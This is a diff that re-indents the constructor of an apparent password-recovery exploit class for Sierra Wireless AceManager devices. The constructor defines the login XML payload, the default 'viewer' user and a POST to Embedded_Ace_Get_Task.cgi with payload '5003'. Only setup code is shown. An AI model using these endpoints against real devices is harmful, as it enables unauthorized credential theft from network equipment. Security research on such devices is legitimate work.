@@ -9,18 +9,18 @@ class SierraWirelessPasswordRecovery:
     def __init__(self, target, port):
         self.verbose = False
         self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
-                   "Content-Type": "text/xml",
-                   "Accept": "application/xml, text/xml, */*; q=0.01",
-                   "Accept-Language": "en-US,en;q=0.5",
-                   "X-Requested-With": "XMLHttpRequest",
-                   "Connection": "close"}
+                        "Content-Type": "text/xml",
+                        "Accept": "application/xml, text/xml, */*; q=0.01",
+                        "Accept-Language": "en-US,en;q=0.5",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Connection": "close"}
         self.xml_connect = {"path": "/xml/Connect.xml",
-                       "method": "POST"}
+                            "method": "POST"}
         self.xml_connect_payload = '<request xmlns="urn:acemanager"><connect><login>$username$</login>\
                                <password><![CDATA[$password$]]></password></connect></request>'
         self.cgi_get_task = {"path": "/cgi-bin/Embedded_Ace_Get_Task.cgi",
-                        "method": "POST",
-                        "payload": "5003"}
+                             "method": "POST",
+                             "payload": "5003"}
         self.target = target
         self.port = port
         self.user = 'viewer'
